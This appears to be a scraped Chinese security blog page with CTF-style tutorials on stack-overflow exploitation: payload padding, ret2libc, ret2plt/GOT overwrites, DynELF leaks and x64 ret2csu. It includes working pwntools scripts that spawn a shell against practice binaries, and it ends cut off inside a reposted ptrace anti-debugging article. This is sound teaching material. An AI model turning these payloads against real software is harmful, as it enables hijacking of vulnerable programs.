<p>当我们执行<strong>vul_func</strong>的时候，可以向<strong>bss</strong>段写入一段数据，且存在栈溢出，我们就可以控制它在<strong>read</strong>函数和write函数之间来回执行，实现无限读写，事实上我们的<strong>payload</strong>也是这样构建的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>首先<code>&quot;A&quot;*132</code>是因为<strong>buf</strong>开的栈大小是128个字节，那么只需要再加4个字节覆盖掉<strong>Caller’s EBP</strong>，就可以让我们想要跳转的地址覆盖掉 <strong>Ret Addr</strong>，这里我们是<strong>write</strong>函数，然后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(vulfunc_addr) + p32(1) + p32(address) + p32(4)</span><br></pre></td></tr></table></figure>

<p>构成了<strong>write</strong>函数新的栈帧，其中<code>p32(vulfunc_addr)</code>成为了<strong>write</strong>函数的<strong>Ret Addr</strong>，将重新跳回到<strong>vul_func</strong>重复读写，然后<code>p32(1)</code>就是write函数的第一个参数<strong>STDOUT_FILENO</strong>，然后<code>p32(address)</code>就是我们希望暴露的地址，最后一个<code>p32(4)</code>是我们<strong>write</strong>函数读取的字节数，因为我们就读取了一个<code>p32(address)</code>就是32位系统下的指针，也就是4个字节</p>
<p>然后<code>data = p.recv(4)</code>，也是因为我们希望得到的是一个32位系统的地址指针，也就是4字节，如果是64位系统就是8个字节</p>
<p>然后我们完成了leak函数的构造，接下来我们只需要调用<strong>pwntools</strong>里面的工具就ok了，就可以获得我们想要的地址了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, elf=ELF(&apos;./rop_sample&apos;))</span><br><span class="line">system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)</span><br></pre></td></tr></table></figure>

<p>然后<strong>payload2</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br></pre></td></tr></table></figure>

<p>就是我们先调用<strong>read</strong>函数手动输入<strong>“bin/sh“</strong>到<strong>bss</strong>段地址，<strong>pppr</strong>就是<strong>pop*3+ret</strong>，<strong>pop*3</strong>就是为了栈平衡，因为<strong>read</strong>函数引入了三个参数，然后<strong>ret</strong>就会<strong>ret</strong>到<strong>system_addr</strong>开始调用<strong>system</strong>函数，因为第二个参数是<strong>bss_addr</strong>，之前我们已经在<strong>bss</strong>上放入了<strong>“bin/sh”</strong>，事实上就执行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(‘/bin/sh’)</span><br></pre></td></tr></table></figure>

<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>首先是x64最为重要的两个变化</p>
<ul>
<li>应用程序地址空间的改变</li>
<li>参数传参方式的改变（<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、<strong>R8</strong>、<strong>R9</strong>）+<strong>Stack</strong></li>
</ul>
<p>比如我们调用一个<strong>write</strong>函数的汇编，因为这些数据只用32位就可以，所以是<strong>edx</strong>或者<strong>esi</strong>这类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov edx,oxd //argv[2]</span><br><span class="line">mov esi,0x400644 // argv[1]</span><br><span class="line">mov edi,0x1 //argv[0]</span><br><span class="line">call 0x400430&lt;write@plt&gt;</span><br></pre></td></tr></table></figure>

<p>我们一般传参常用的Gadgets就是以下三个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget1 = mov rdx,r13 | mov rsi,r14 | mov edi,r15d | call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>其中<code>call    qword ptr [r12+rbx*8]</code>就是我们希望调用的函数，然后<code>mov rdx,r13</code>就是第三个参数，<code>mov rsi,r14</code>是第二个参数，<code>mov edi,r15d</code>是第四个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget2 = pop rbx | pop rbp | pop r12 | pop r13 | pop r14 | pop r15 | ret</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget3 = pop rdi | ret</span><br></pre></td></tr></table></figure>

<p>常见模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span> <span class="comment">#gadget1 mmmc</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span> <span class="comment">#gadget2 ppppppr</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span> </span><br><span class="line"><span class="comment">#32位 fakeebp是4个字节， 64位为8个字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'\x90'</span> * <span class="number">0x38</span> <span class="comment">#nop</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>如果希望使用<strong>write</strong>函数暴露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br></pre></td></tr></table></figure>

<p>一般接受用的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(8))</span><br></pre></td></tr></table></figure>

<p>这里有个<strong>Tips</strong>，一般我们要搜索<strong>libc</strong>里面的函数地址就用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symblos[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure>

<p>字符串就用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.search[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure>

<p>在gdb里面可以用bt命令展示各函数的起始地址</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/22/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1/" class="post-title-link" itemprop="url">浅谈栈溢出填充布局-1</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-22 22:32:54" itemprop="dateCreated datePublished" datetime="2019-12-22T22:32:54-08:00">2019-12-22</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-23 14:33:16" itemprop="dateModified" datetime="2019-12-23T14:33:16-08:00">2019-12-23</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h2><p>如果判断我们再写payload的时候，该如何填充分配布局。首先上一张经典的内存图</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png" alt></p>
<p>我们都知道栈溢出的关键点就是覆盖修改掉<strong>EBP</strong>所指地址下面的<strong>Return Addr</strong>从而达到劫持EIP修改程序流程</p>
<p>举一个例子</p>
<p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/2.png" alt="img"></p>
<p>我们打开IDA常常能看到形似这样的提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf; //[rsp+0h][rbp-80h]</span><br></pre></td></tr></table></figure>

<p>就这代表<strong>buf</strong>的起始地址距离rbp的长度是0x80，也就是0x80个字节，也就是0x80个char类型数据，好了，我们知道如果填充0x80个字母，就会覆盖掉ESP所指的内容，那么距离我们需要覆盖掉的<strong>Return Addr</strong>还隔着一个<strong>Main’s EBP</strong>，这是一个指针的数据类型，我们知道在32位系统里面，一个指令所占的内存是4个字节，如果是64位系统就是8个字节，所以我们还需要填充相应个数的字节，我们才能将我们的伪造的Return Addr覆盖到那个位置</p>
<p>如果要判断每个变量的相对地址大小也很容易，再举个例子</p>
<p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/when_did_you_born/pic/2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char v4; //[rsp+0h][rbp-20h]</span><br><span class="line">int v5;//[rsp+8h][rbp-18h]</span><br></pre></td></tr></table></figure>

<p>可以知道两个变量的距离就是相距0x8个字节</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>继续先放一张图</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png" alt></p>
<p>我们一般的<strong>ROP</strong>就是覆盖掉<strong>Ret Addr</strong>使得EIP指向我们需要的内存中已经存在的指令</p>
<p>例如，如果我们有可以利用的<strong>libc</strong>的话，一般是直接跳转调用<strong>system</strong>函数。原本ret addr返回到caller func的call callee下一条指令处，但我们将其修改为system函数的地址，此时ret就相当于调用了system。而system调用时，我们的payload在Ret addr下面伪造了栈帧，布置其ret addr为exit函数地址，如果是rop，就是下一个gadgets的地址，然后接下来的内存地址就是函数的调用参数，攻击链如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret -&gt; system(arg) -&gt; exit</span><br></pre></td></tr></table></figure>

<p>举一个 bamboofox 中 ret2libc1 为例  </p>
<p>首先，我们可以检查一下程序的安全保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2libc1 checksec ret2libc1    </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048720</span> : /bin/sh</span><br></pre></td></tr></table></figure>

<p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">08048460</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure>

<p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">112</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>可以到核心payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos; * 112 + system_plt +&apos;b&apos; * 4 + binsh_addr</span><br></pre></td></tr></table></figure>

<p>因为<strong>v4</strong>是<code>[ebp-64h]</code>，然后又是32位系统，故若想要<strong>system</strong>的地址覆盖<strong>ret addr</strong>就需要<strong>0x64+0x4</strong>个字节，然后我们不需要再跳转到其他地址，所以返回地址就随便填四个字节的数据就可以，然后第一个参数<strong>binsh</strong>的地址就跟着</p>
<p>如果我们想查看已有符号表的函数地址，可以在<strong>gdb</strong>里面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br></pre></td></tr></table></figure>

<h3 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h3><p><strong>ALSR</strong>的出现导致<strong>libc.so</strong>基址随机化，而<strong>plt</strong>缺因为<strong>ELF</strong>本身没有随机化(前<strong>PIE</strong>时代)而不会发生变化，所以我们可以不直接ret2libc，而是间接ret2plt</p>
<p><strong>PLT(Proceduce Link Table)，GOT(Global Offset Table)</strong></p>
<p><strong>GOT</strong>是一个存储外部库函数的表，可以用<strong>GOT</strong>表来间接引用全局变量、函数，也可以把<strong>GOT</strong>表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，<strong>GOT</strong>是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个<code>printf</code>函数，就会和<strong>GOT</strong>表产生关系。那这又和<strong>PLT</strong>有什么关系呢</p>
<p>PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？</p>
<p><strong>其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset）</strong></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(128).png" alt></p>
<p>也就是说<code>printf@plt</code>的在内存中的真实地址是： <strong>GOT基值+PLT存储的偏移量</strong></p>
<ul>
<li><code>got[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>GOT</strong></li>
<li><code>plt[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>PLT</strong></li>
</ul>
<p>一般来说GOT表是可以改变的，是可写的，PLT表一般是不变的</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p>
<p>当我们第一次<strong>call puts</strong>函数，首先跳转到<strong>PLT</strong>表中的<strong>puts</strong>项(<strong>0x080482b0</strong>)，然后又会<strong>jmp</strong>到<strong>GOT</strong>表中的一个地址(<strong>0x80496f8</strong>)，然后这个地址中存储的数据刚好就是<strong>jmp</strong>指令的下一个<strong>push</strong>指令(<strong>0x080482b6</strong>)，实际上<strong>push</strong>的是<strong>PLT</strong>表中<strong>puts</strong>函数的编号，实际上就是模拟了一个<strong>call</strong>，然后又会跳转到一个全局函数(<strong>0x80482a0</strong>)，去<strong>GOT</strong>表中找到真正的<strong>puts</strong>地址(<strong>0xf7e7c7e0</strong>)，同时会修改<strong>PLT</strong>表中<strong>jmp</strong>的第一个地址(<strong>9x80496f8</strong>)的内容为真正的<strong>puts</strong>地址(<strong>0xf7e7c7e0</strong>)</p>
<p>当程序第二次<strong>call puts</strong>时从<strong>PLT</strong>表里<strong>jmp</strong>的就是真正的<strong>puts</strong>函数地址了</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt="img"></p>
<p>Ret2plt较之ret2libc更为局限，因为只有漏洞程序调用的库函数才会出现在PLT表。Redhat和fedora上部署了一种ASCII armoring的保护机制。这一机制使得库函数地址都包含一个\x00字节(用来截断copy)</p>
<p>衍生出一种利用PPR链(POP POP Ret)和strcpy@plt拼凑出system地址的新ret2plt方法，并覆写某个其他plt函数的got项<img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(129).png" alt></p>
<p>相当于第一次<strong>copy system</strong>函数<strong>PLT</strong>的<strong>GOT</strong>项的第一个字节到<strong>puts</strong>函数<strong>PLT</strong>的<strong>GOT</strong>项的第一个字节，然后<strong>PPR</strong>的链作为返回地址，<strong>got[0] of puts</strong> 和<strong>Addr of system[0]</strong>分别是第<strong>1</strong>和第<strong>2</strong>参数，则当<strong>PPR</strong>后，弹出栈中<strong>got[0] of puts</strong>和<strong>Addr of system[0]</strong>后，<strong>ret</strong>的地址就是<strong>Addr of system[0]</strong>下面的又一个<strong>strcpy</strong>函数，因为是32位系统，一个指针4个字节，重复4次就能修改<strong>puts</strong>为<strong>system</strong>函数</p>
<p>常见的read函数payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr) + p32(0) + p32(buf2_addr) + p32(0x100)</span><br></pre></td></tr></table></figure>

<p>返回地址是<strong>buf</strong>的话，一般就是<strong>buf</strong>上面布置了<strong>ROP</strong>链或者<strong>shellcode</strong></p>
<p>常见的write函数payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(elf.symbols[&quot;write&quot;])+p32(main) + p32(1)+p32(elf.got[&quot;write&quot;])+p32(4)</span><br></pre></td></tr></table></figure>

<p>就是返回地址是<strong>mian</strong>函数的地址，然后其他三个参数参考<strong>write</strong>函数的<strong>API</strong>定义</p>
<p>如果已知libc.so则可以先通过ELF先计算出write和system的偏移，再用输出地址减去write的偏移就可以计算出libc.so的基址，再用libc.so的基址加上system的偏移就可以动态算出system在本次运行时的地址，未知libc则需要额外的leak函数</p>
<p>一般暴露的都是函数在GOT表中的地址</p>
<p>得到write函数与system函数偏移量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_set = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</span><br></pre></td></tr></table></figure>

<p>然后当我们拿到<code>write</code>函数在<strong>GOT</strong>表中的真实地址时,就可以计算出基值的真实地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - off_set</span><br></pre></td></tr></table></figure>

<p>合并在一起就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - （libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]）</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/21/╫¬╘╪-Linux─µ╧≥╓«╡≈╩╘/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/21/╫¬╘╪-Linux─µ╧≥╓«╡≈╩╘/" class="post-title-link" itemprop="url">转载-Linux逆向之调试&反调试</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-21 19:03:22" itemprop="dateCreated datePublished" datetime="2019-12-21T19:03:22-08:00">2019-12-21</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-22 11:03:56" itemprop="dateModified" datetime="2019-12-22T11:03:56-08:00">2019-12-22</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>转载自：<a href="https://xz.aliyun.com/t/6882" target="_blank" rel="noopener">https://xz.aliyun.com/t/6882</a></p>
<h2 id="调试器的实现原理"><a href="#调试器的实现原理" class="headerlink" title="调试器的实现原理"></a>调试器的实现原理</h2><p>要想进行调试，调试器是必不可少的，首先需要了解一下我们常用的Linux下的调试器如GDB，是如何实现的</p>
<p>GDB 基于ptrace编写而成的调试器，ptrace是一个Linux提供的用于调试的系统调用</p>
<p>函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NAME </span><br><span class="line">    ptrace - process trace</span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ptrace.h&gt;</span><br><span class="line">       long ptrace(enum __ptrace_request request, pid_t pid,</span><br><span class="line">                   void *addr, void *data);</span><br></pre></td></tr></table></figure>

<p>简单来说， <strong>ptrace系统调用提供了一种方法来让父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。 主要用来实现断点调试和系统调用跟踪</strong></p>
<p>这个函数根据 request 参数来表示想要请求执行的行为 ，并且根据不同的request决定后续的pid、addr、data参数是否有意义。</p>
<p>下面是几个常见的 request 参数的可选项：</p>
<ul>
<li><p>PTRACE_TRACEME ：表示本进程将被其父进程跟踪，此时剩下的pid、addr、data参数都没有实际意义可以全部为0</p>
<p>这个选项只能用在被调试的进程中，也是被调试的子进程唯一能用的request选项，其他的都只能用父进程调试器使用</p>
</li>
<li><p>PTRACE_ATTACH：attach到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次PTRACE_TRACEME操作，可想而知，gdb的attach命令使用这个参数选项实现的</p>
<p><del>变成其他进程的爹，你就可以调试它</del></p>
</li>
<li><p>PTRACE_CONT：继续运行之前停止的子进程，也可以向子进程发送指定的信号，这个其实就相当于gdb中的continue命令</p>
</li>
</ul>
<p>除了上面的几个，还有很多操作子进程内存数据寄存器数据的request选项，详见man手册，这里不一一展开，</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191201144906-ab752400-1406-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191201144906-ab752400-1406-1.png" alt="img"></a></p>
<p>如上图所示，gdb调试的本质实际上就是父进程使用ptrace函数对子进程进行一系列的命令操作</p>
<p>这里举一个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 